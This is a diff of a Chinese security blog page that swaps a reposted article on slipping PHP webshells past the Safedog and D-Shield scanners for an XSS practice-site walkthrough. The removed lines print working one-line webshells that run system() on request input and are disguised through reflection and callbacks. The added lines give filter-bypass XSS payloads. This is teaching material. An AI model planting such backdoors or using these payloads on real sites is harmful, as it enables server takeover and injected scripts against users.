@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="bypass," />
+  <meta name="keywords" content="bypass,xss," />
 
 
 
@@ -84,18 +84,31 @@
 
 
 
-<meta name="description" content="xx狗静态查杀大致分析目前，传统的WAF软件主要通过定时或是由管理员手动对网站">
-<meta name="keywords" content="bypass">
+<meta name="description" content="科普XSS漏洞是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。">
+<meta name="keywords" content="bypass,xss">
 <meta property="og:type" content="article">
-<meta property="og:title" content="过狗总结（转）">
-<meta property="og:url" content="http://sunu11.com/2016/11/05/5/index.html">
+<meta property="og:title" content="我与XSS的感情之路(1)">
+<meta property="og:url" content="http://sunu11.com/2017/07/20/12/index.html">
 <meta property="og:site_name" content="SuNu11&#39;Blog">
-<meta property="og:description" content="xx狗静态查杀大致分析目前，传统的WAF软件主要通过定时或是由管理员手动对网站">
+<meta property="og:description" content="科普XSS漏洞是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-03-21T05:43:38.000Z">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-1.png">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-2.png">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-3.png">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-4.png">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-5.png">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-6.png">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-7.png">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-8.png">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-9.png">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-10.png">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-11.png">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-12.png">
+<meta property="og:updated_time" content="2017-08-28T14:02:45.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="过狗总结（转）">
-<meta name="twitter:description" content="xx狗静态查杀大致分析目前，传统的WAF软件主要通过定时或是由管理员手动对网站">
+<meta name="twitter:title" content="我与XSS的感情之路(1)">
+<meta name="twitter:description" content="科普XSS漏洞是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。">
+<meta name="twitter:image" content="http://ofum8yjv2.bkt.clouddn.com/q-1.png">
 
 
 
@@ -123,13 +136,13 @@
 
 
 
-  <link rel="canonical" href="http://sunu11.com/2016/11/05/5/"/>
+  <link rel="canonical" href="http://sunu11.com/2017/07/20/12/"/>
 
 
 
 
 
-  <title> 过狗总结（转） | SuNu11'Blog </title>
+  <title> 我与XSS的感情之路(1) | SuNu11'Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -270,7 +283,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://sunu11.com/2016/11/05/5/">
+  <link itemprop="mainEntityOfPage" href="http://sunu11.com/2017/07/20/12/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="SuNu11">
@@ -294,7 +307,7 @@
             
             
               
-                过狗总结（转）
+                我与XSS的感情之路(1)
               
             
           </h1>
@@ -307,8 +320,8 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-11-05T13:31:28+08:00">
-                2016-11-05
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-20T09:43:55+08:00">
+                2017-07-20
               </time>
             
 
@@ -326,8 +339,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/shell/" itemprop="url" rel="index">
-                    <span itemprop="name">shell</span>
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
                   </a>
                 </span>
 
@@ -341,8 +354,8 @@
             
               <span class="post-comments-count">
                 <span class="post-meta-divider">|</span>
-                <a href="/2016/11/05/5/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/11/05/5/" itemprop="commentCount"></span>
+                <a href="/2017/07/20/12/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/07/20/12/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -368,9 +381,37 @@
       
 
       
-        <p> </p><h3>xx狗静态查杀大致分析</h3><p>目前，传统的WAF软件主要通过定时或是由管理员手动对网站<a id="more"></a>程序进行查杀的主动方式以及当请求者浏览该文件时由WAF软件被动的方式进行查杀。而查杀的原理主要是通过对目标文件的特征与网马规则库进行比对。这种查杀原理有它的局限性，攻击者可以利用脚本语言的特性对已被查杀出来的WebShell进行伪装成类似正常的页面程序从而避开WAF软件的查杀。</p><p>因为狗的查杀并没有相关资料或文档等。不过，我们仍然可以从狗的查杀中得到部分结论。<br></p><ul><li>利用正则表达式<br></li></ul><p>这种方法最大的好处就是简单。但是，正则表达式最大的缺点就是其只对关键危险函数进行检查。也就是说，我们将关键函数稍微通过某种方式变换一下，正则表达式无法查杀了。而且，这种方法的误报率也很高。所以，这种方法的查杀效果不是很理想。但是这种方法最大的好处就是简单，速度快。一般在查杀web目录下的图片等文件时使用此种方法。</p><li>利用PHP代码分析技术<br></li><p>这种方法最大的好处是解决了正则查杀误报率过高的问题。在这里，我们可以大致分析一下查杀引擎的工作原理：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;对PHP文件做预处理，去除掉注释，空格，等没有用的东西</p><p>我们可以在php中写入以下内容</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/<em>system(“$_get[‘x’]”);
-</em>/</span><span class="hljs-meta">?&gt;</span></code></pre><p>使用和d盾查杀，发现没有查杀出一句话。原来查杀引擎在查杀的时候，会做类似于编译器的优化，去掉一些乱七八糟的东西。也许你会认为代码写在注释里，php的编译器也会做类似优化操作，将其去除。而且，代码在注释里也不可能运行的。所以你可能会认为的查杀方式很正确。既简单又高效，为下一步处理降低了负担。</p><p>但是其实是不正确的。查阅php manual，在PHP 5 &gt;= 5.1.0, PHP 7 中，php官方提供了一个函数<span style="font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 1em;">ReflectionClass::getDocComment。</span>简而言之，这个函数最主要的作用是获取php的注释。我们可以通过这个函数获取文档中注释，然后通过php的动态函数调用等xxxx各种方法去执行我们所获取到的代码。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;对上一步预处理所得到的结果做词法分析。以下代码</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1">$a=<span class="hljs-string">“system(@$_get[‘x’])”</span></code></pre><p>和</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1">system(@$_get[<span class="hljs-string">‘x’</span>])</code></pre><p>我们分别去查杀这两个文件。结果显而易见，第一个没有办法去查杀，而第二个一定会被查杀。由此，我们可以得出结论，查杀引擎会对php文件做词法分析，然后只对相关函数调用等再做进一步查杀。而类似于字符串等这样变量，查杀引擎基本上会直接将其舍弃。不再做进一步分析。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;对上一步结果进行语法分析</p><p>从这一步开始，查杀引擎开始对相关函数的调用进行语法分析。分析变量作用域，函数参数调用等。再与webshell特征库进行比对，用以确定是否为webshell文件。</p><p>在查杀引擎中，基本上会对if等条件控制条件直接跳过，直接分析里面的代码。例如下面的例子</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">false</span>)<br>  {<br>    system(<span class="hljs-string">‘@$_get[‘</span>x<span class="hljs-string">‘]’</span>);<br>}</code></pre><p>这段代码在php文件进行编译的时候，会对其进行分支优化。也就是说，这段代码因为if语句中为false，属于死码，永远不会运行，所以编译器会将其删除掉。但是换做查杀引擎，会直接查杀并报警。据我猜测，php的控制流程跳转那么多，如果查杀引擎也像编译器那样做分支结构的优化，势必会造成查杀效率的降低。所以没办法，只好不管分支结构，直接查杀。</p><h3>躲避查杀的方法</h3><p>上面大致介绍了两种查杀引擎的办法，虽然比较粗略，但是也给了我们躲避查杀的思路。那就是，想办法隐藏关键的特征码。</p><ul><li>利用php反射技术</li></ul><p>反射是在PHP运行状态中，扩展分析PHP程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。反射是操纵面向对象范型中元模型的API，其功能十分强大，可帮助我们构建复杂，可扩展的应用。其用途如：自动加载插件，自动生成文档，甚至可用来扩充PHP语言。</p><p>也就是说，我们可以利用反射去加载system函数，通过反射去传参。因为在反射中，system这个特征码只不过是字符串，所以我们很容易对其进行加解密等操作去躲开查杀引擎的查杀。</p><p>过狗例子</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span>$func = <span class="hljs-keyword">new</span> ReflectionFunction(<span class="hljs-string">“system”</span>);<br><span class="hljs-keyword">echo</span> $func-&gt;invokeArgs(<span class="hljs-keyword">array</span>(<span class="hljs-string">“$_GET[c]”</span>));<span class="hljs-meta">?&gt;</span></code></pre><p>这个安全狗查不到，但是d盾可以查到，而d盾查杀结果是可疑函数调用，基本上等于没查到。下面来一段d盾和都查不到的shell</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorld</span> </span>{<p></p>
-<p>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sayHelloTo</span><span class="hljs-params">($name)</span> </span>{<br>      $last_line = system($name);<br>              <span class="hljs-keyword">return</span> $last_line;<br>  }<br>}<br>$a=$_GET[<span class="hljs-string">“a”</span>];<br>$reflectionMethod = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-string">‘HelloWorld’</span>, <span class="hljs-string">‘sayHelloTo’</span>);<br><span class="hljs-keyword">echo</span> $reflectionMethod-&gt;invoke(<span class="hljs-keyword">new</span> HelloWorld(), $a);<br><span class="hljs-meta">?&gt;</span><br></p></code></pre><p>利用反射类中函数的办法去执行危险函数</p><ul><li>利用php的callback方法<br></li></ul><p>自 PHP 5.4 起可用 <a href="http://php.net/manual/zh/language.types.callable.php" target="_blank" rel="external">callable</a>&nbsp;类型指定回调类型 callback。本文档基于同样理由使用 <a href="#language.types.callback">callback</a>&nbsp;类型信息。一些函数如 <a href="http://php.net/manual/zh/function.call-user-func.php" target="_blank" rel="external">call_user_func()</a>&nbsp;或 <a href="http://php.net/manual/zh/function.usort.php" target="_blank" rel="external">usort()</a>&nbsp;可以接受用户自定义的回调函数作为参数。回调函数不止可以是简单函数，还可以是对象的方法，包括静态类方法。也就是说，callback也可以接受一个字符串变量，并将其作为函数去执行。下面是例子</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span>$cb= <span class="hljs-string">‘system’</span>;ob_start($cb);<span class="hljs-keyword">echo</span> $_GET[c];ob_end_flush();<span class="hljs-meta">?&gt;</span></code></pre><p>在php中回调函数有很多，打开php的官方手册，找到支持callback的函数，基本上都可以用来做过狗一句话</p><ul><li>特征码的变形隐藏<br></li></ul><p>在上面的例子中，我们已经成功的将函数调用转换为字符串类型，然后通过反射等方式去执行。但是我们还需要躲避正则匹配等查杀引擎，这里还需要对特征码变形。当然了，这里变形的操作就很多了，例如base64加密，gzip压缩，或者，也可以自己写一段加解密字符串的函数。这里就不详细介绍了。</p><p>过狗的例子有很多，这里只不过给出思路。php作为一门弱类型的语言，可扩展性，灵活性比java一类等语言强很多。但是过于灵活也会导致很多安全问题。在静态查杀中，很容易躲避查杀，造成漏报等问题。所以在安全狗的博客中，也讲了静态查杀不太靠谱，还是防御好黑客上传shell才是正道，使其没有上传webshell的机会。</p><p>初次写文章，有些地方可能会有技术上的问题，望大牛斧正批评。也望各路大神交流过狗思路，共同学习进步。</p><p>参考资料</p><p></p><ul><li><a href="http://blog.safedog.cn/?p=77" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">http://blog.safedog.cn/?p=77</a>&nbsp; &nbsp; &nbsp; 一种理想的网站木马防护思路探究<br></li><li><a href="http://php.net/manual/zh/language.types.callable.php" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">http://php.net/manual/zh/language.types.callable.php</a>&nbsp; &nbsp; &nbsp; &nbsp; phpcallback<br></li><li><a href="https://secure.php.net/manual/zh/reflectionfunction.invoke.php" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">https://secure.php.net/manual/zh/reflectionfunction.invoke.php</a>&nbsp;php &nbsp; 反射<br></li><li><a href="https://security.tencent.com/index.php/blog/msg/58" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/58</a>&nbsp;TSRC<br></li><li>挑战赛： PHP防御绕过挑战实录<br></li><li><a href="http://wrox.cn/article/100032494/" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">http://wrox.cn/article/100032494/</a>&nbsp;未知攻焉知防 — Webshell变形技术集锦<br></li></ul><p></p><p><font face="Times New Roman" size="2">文／烤土豆啦（简书作者）原文链接：<a href="http://www.jianshu.com/p/a23fbd1825c8著作权归作者所有，转载请联系作者获得授权，并标注“简书作者”。" target="_blank" rel="external">http://www.jianshu.com/p/a23fbd1825c8著作权归作者所有，转载请联系作者获得授权，并标注“简书作者”。</a></font></p><p><br></p><p><br></p><p></p>
+        <h2 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h2><p>XSS漏洞是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。<a id="more"></a><br>攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。本文主要是通过几个在线练习平台，记录一下个人对于xss漏洞的一些思路和总结。</p>
+<h2 id="平台1-xss-quiz"><a href="#平台1-xss-quiz" class="headerlink" title="平台1 xss-quiz"></a>平台1 <a href="http://xss-quiz.int21h.jp" target="_blank" rel="external">xss-quiz</a></h2><p><strong><em>Stage#1: <a href="http://xss-quiz.int21h.jp/?sid=2a75ff06e0147586b7ceb0fe68ee443b86a6e7b9" target="_blank" rel="external">http://xss-quiz.int21h.jp/?sid=2a75ff06e0147586b7ceb0fe68ee443b86a6e7b9</a></em></strong></p>
+<p>使用正常xss payload弹出domain即可通过。payload如：<br><code>&lt;img onerrer=&quot;alert(document.domain);&quot;src=&gt; &lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-1.png" alt="图1"></p>
+<p><strong><em>Stage#2: <a href="http://xss-quiz.int21h.jp/stage2.php?sid=34ccb7f2bee3d0be52bf33339d0240c96f1cb61d" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage2.php?sid=34ccb7f2bee3d0be52bf33339d0240c96f1cb61d</a></em></strong><br>这一题关键在于语句需要闭合，当闭合语句后，均可触发。payload如：<br><code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;  &quot;onclick=alert(document.domain) value=&quot;asd</code></p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-2.png" alt="图2"></p>
+<p><strong><em>Stage#3: <a href="http://xss-quiz.int21h.jp/stage-3.php?sid=f3a8820ead8d740c43effd6cdae1fa1b41d0f0f7" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php?sid=f3a8820ead8d740c43effd6cdae1fa1b41d0f0f7</a></em></strong><br>该题在写入js语句后，对尖括号进行了转义</p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-3.png" alt="图3"></p>
+<p>尝试绕过，没有实现，但是可以在p2参数的参数值处构造跨站语句，成功弹出domain</p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-4.png" alt="图4"></p>
+<p><strong><em>Stage#4: <a href="http://xss-quiz.int21h.jp/stage4.php?sid=9b47b7196b1da242b0d9ce4099ed0f17858b56e0" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage4.php?sid=9b47b7196b1da242b0d9ce4099ed0f17858b56e0</a></em></strong><br>p1、p2均作过滤了，在p3处闭合语句即可弹出，可通过查看源码发现隐藏的输入框，修改hackme的那个type为text，即p3的输入点即可，payload：<br><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
+<p><strong><em>Stage#5: <a href="http://xss-quiz.int21h.jp/stage5.php?sid=b4d8b0467f463e3059a6e739d37739b6a364027e" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage5.php?sid=b4d8b0467f463e3059a6e739d37739b6a364027e</a></em></strong><br>长度限制，使用burp改包绕过即可。也可以更改如图所示长度进行绕过，payload：<br><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-5.png" alt="图5"></p>
+<p><strong><em>Stage#6: <a href="http://xss-quiz.int21h.jp/stage6.php?sid=a9998f35ee37ef3664ab6c6fc2574f428231c725" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage6.php?sid=a9998f35ee37ef3664ab6c6fc2574f428231c725</a></em></strong><br>该题过滤了尖括号&lt;&gt;，<br><img src="http://ofum8yjv2.bkt.clouddn.com/q-6.png" alt="图6"><br>尝试绕过，发现可用鼠标移动类进行绕过如：<br><code>&quot;onmouseover=&quot;alert(document.domain);&quot; &quot;onmouseout=&quot;alert(document.domain);&quot; &quot;onclick=alert(document.domain)等</code></p>
+<p><strong><em>Stage#7: <a href="http://xss-quiz.int21h.jp/stage07.php?sid=deeba845f047ee9df2627ec269f20c955e2eb8b8" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage07.php?sid=deeba845f047ee9df2627ec269f20c955e2eb8b8</a></em></strong><br>通过测试，发现该题过滤了&lt;&gt;、”、&amp;等，而且输入空格后自动添加双引号，因此，可构造此类payload如: <code>a onmouseover=alert(document.domain)</code>实现弹窗。</p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-7.png" alt="图7"></p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-8.png" alt="图8"></p>
+<p><strong><em>Stage#8: <a href="http://xss-quiz.int21h.jp/stage008.php?sid=1f0696e59ff506dee925f3e6bd62e9f5103543aa" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage008.php?sid=1f0696e59ff506dee925f3e6bd62e9f5103543aa</a></em></strong><br>此题采用javascript伪协议即可，比较简单。Payload：<code>javascript:alert(document.domain);</code></p>
+<p><em>*</em>Stage#9: <a href="http://xss-quiz.int21h.jp/stage_09.php?sid=9fb2098e09f0cdf338e09149e6f1550706fc3934" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage_09.php?sid=9fb2098e09f0cdf338e09149e6f1550706fc3934</a><br>此题提示信息为UTF7,因此通过UTF-7转码即可，不用burp截包，需要更改charset类型为text，并更改其value为UTF-7,然后即可弹窗payload：<br><code>+ACIAIABvAG4AbQBvAHUAcwBlAG0AbwB2AGUAPQAiAGEAbABlAHIAdAAoAGQAbwBjAHUAbQBlAG4AdAAuAGQAbwBtAGEAaQBuACk-</code></p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-9.png" alt="图9"></p>
+<p><strong><em>Stage#10: <a href="http://xss-quiz.int21h.jp/stage00010.php?sid=582038d983e1b7cff0888412ffa49b8ae03ecf38" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage00010.php?sid=582038d983e1b7cff0888412ffa49b8ae03ecf38</a></em></strong><br>通过提示可看到domain被过滤了，可使用dodomainmain嵌套的方式进行绕过，因此，payload为：<code>&quot;onmouseover=&quot;alert(document.domdomainain);//</code></p>
+<p><strong><em>Stage#11: <a href="http://xss-quiz.int21h.jp/stage11th.php?sid=57ea445522e17a40142908ada7bd665857c358d9" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage11th.php?sid=57ea445522e17a40142908ada7bd665857c358d9</a></em></strong><br>可以从提示中看到过滤规则如下：”s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;”，因此可以通过进行编码的方式构造xss语句。注意闭合前后。即可弹窗，payload：<br><code>&quot;&gt;&lt;a href=javascr&amp;#105;pt:alert(document.domain)&gt;xss&lt;/a&gt;</code></p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-10.png" alt="图10"></p>
+<p><strong><em>Stage#12: <a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=7fc1df5b4cd62ce2afaaa11268a5039d3a67632a" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage_no012.php?sid=7fc1df5b4cd62ce2afaaa11268a5039d3a67632a</a></em></strong><br>此题过滤规则如下：”s/[\x00-\x20\&lt;>\”\’]//g;”，过滤很严，从x00-x20,&lt;&gt;,”’都被过滤，于是用什么闭合是此题的关键，在IE8下可以通过`进行闭合因此，可以构造payload：<br><code>`` onmouseover=alert(document.domain);</code></p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-11.png" alt="图11"></p>
+<p><strong><em>Stage#13: <a href="http://xss-quiz.int21h.jp/stage13_0.php?sid=eb77af0358676519402c3be00df480f638b168b7" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage13_0.php?sid=eb77af0358676519402c3be00df480f638b168b7</a></em></strong><br>此题说是再CSS中用expression来实现js中的on事件，进而执行xss语句，再ie下可以利用，payload如下：xx:expression(onmouseover=function(){alert(document.domain)})</p>
+<p><strong><em>Stage#14: <a href="http://xss-quiz.int21h.jp/stage-_-14.php?sid=91443a5a0cc083c52ce78d11b5bf1beb238cb93b" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-_-14.php?sid=91443a5a0cc083c52ce78d11b5bf1beb238cb93b</a></em></strong><br>此题与上一题相似，但是做了过滤：s/(url|script|eval|expression)/xxx/ig;过滤url，eval，script，expression因此，需要尝试绕过过滤，经过尝试，可以利用注释符<code>/**/、\、\0、编码</code>等方式绕过。Payload如：<br><code>xx:expre/**/ssion(onmouseover=function(){alert(document.domain)})</code></p>
+<p><strong><em>Stage#15：<a href="http://xss-quiz.int21h.jp/stage__15.php?sid=26ac2a0522c04a788c217fd8d7847aab1626f726" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage__15.php?sid=26ac2a0522c04a788c217fd8d7847aab1626f726</a></em></strong><br>本题经过测试将&lt;&gt;进行了转义，并且过滤了\，无法使用事件类型构造语句实现弹窗。因此考虑绕过其过滤规则，经过测试，可以使用编码进行绕过将&lt;&gt;进行16进制编码或者unicode编码即可。Payload:<br><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</code><br><code>\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</code></p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-12.png" alt="图12"></p>
+<p><strong><em>Stage#16：<a href="http://xss-quiz.int21h.jp/stage00000016.php?sid=b3c99680d88d8f9002dce8b26f167c9c0a3a73a9" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage00000016.php?sid=b3c99680d88d8f9002dce8b26f167c9c0a3a73a9</a></em></strong><br>此题与上一题相似，多一部分过滤：”s/\x/\\x/ig;”，因此无法使用16进制来绕过&lt;&gt;的过滤，用unicode编码同样可以绕过，也可以使用10进制绕过。<br>Payload: <code>\\74script\\76alert(document.domain);\\74/script\\76</code></p>
+<p>Stage#17、Stage#18因为版本问题，过不去23333333。</p>
 
       
     </div>
@@ -389,7 +430,7 @@
  
    <div class="">
    <p><span>
-   <br/><br/><b>本文出处：</b><a href="/2016/11/05/5/" title="过狗总结（转）">http://sunu11.com/2016/11/05/5/</a><br/><b>本文基于：</b><a target="_blank" title="Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)" href="http://creativecommons.org/licenses/by-sa/4.0/"> 知识共享署名-相同方式共享 4.0 </a>国际许可协议发布，欢迎转载，演绎或用于商业目的，但是必须保留本文的署名<a href="http://www.sunu11.com/">sunu11</a>及链接。
+   <br/><br/><b>本文出处：</b><a href="/2017/07/20/12/" title="我与XSS的感情之路(1)">http://sunu11.com/2017/07/20/12/</a><br/><b>本文基于：</b><a target="_blank" title="Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)" href="http://creativecommons.org/licenses/by-sa/4.0/"> 知识共享署名-相同方式共享 4.0 </a>国际许可协议发布，欢迎转载，演绎或用于商业目的，但是必须保留本文的署名<a href="http://www.sunu11.com/">sunu11</a>及链接。
    </span></p>
    </div>
  
@@ -421,6 +462,8 @@
           
             <a href="/tags/bypass/" rel="tag"># bypass</a>
           
+            <a href="/tags/xss/" rel="tag"># xss</a>
+          
         </div>
       
 
@@ -428,8 +471,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/10/30/3/" rel="next" title="OpenStack云计算平台初体验">
-                <i class="fa fa-chevron-left"></i> OpenStack云计算平台初体验
+              <a href="/2017/04/28/11/" rel="next" title="Web源码泄露总结">
+                <i class="fa fa-chevron-left"></i> Web源码泄露总结
               </a>
             
           </div>
@@ -438,8 +481,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2016/11/05/4/" rel="prev" title="sqlmap总结（1）">
-                sqlmap总结（1） <i class="fa fa-chevron-right"></i>
+              <a href="/2017/07/23/13/" rel="prev" title="我与XSS的感情之路(2)">
+                我与XSS的感情之路(2) <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -466,8 +509,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/11/05/5/"
-           data-title="过狗总结（转）" data-url="http://sunu11.com/2016/11/05/5/">
+      <div class="ds-thread" data-thread-key="2017/07/20/12/"
+           data-title="我与XSS的感情之路(1)" data-url="http://sunu11.com/2017/07/20/12/">
       </div>
     
   </div>
@@ -619,7 +662,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">xx狗静态查杀大致分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">躲避查杀的方法</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#科普"><span class="nav-number">1.</span> <span class="nav-text">科普</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#平台1-xss-quiz"><span class="nav-number">2.</span> <span class="nav-text">平台1 xss-quiz</span></a></li></ol></div>
             
 
           </div>
